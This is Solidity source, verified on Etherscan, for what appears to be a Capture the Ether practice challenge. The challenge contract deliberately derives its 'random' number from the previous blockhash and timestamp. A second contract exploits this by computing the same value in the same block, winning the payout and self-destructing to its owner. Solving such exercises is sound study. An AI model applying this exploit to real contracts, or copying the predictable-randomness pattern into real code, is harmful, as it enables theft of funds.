/**
 *Submitted for verification at Etherscan.io on 2021-04-22
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessNewNumberHack {
    address owner;
    address contractAddress = 0x3c2ce3d9Fa3046B09021E88Db5002Ca09CBbD039;
    
    function GuessNewNumberHack() public {
        owner = msg.sender;
    }
    
    function myGuess() public payable {
        uint8 myAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge guessIt = GuessTheNewNumberChallenge(contractAddress);
        guessIt.guess.value(1 ether)(myAnswer);
    }
    
    function done() public {
        require(owner == msg.sender);
        selfdestruct(owner);
    }
}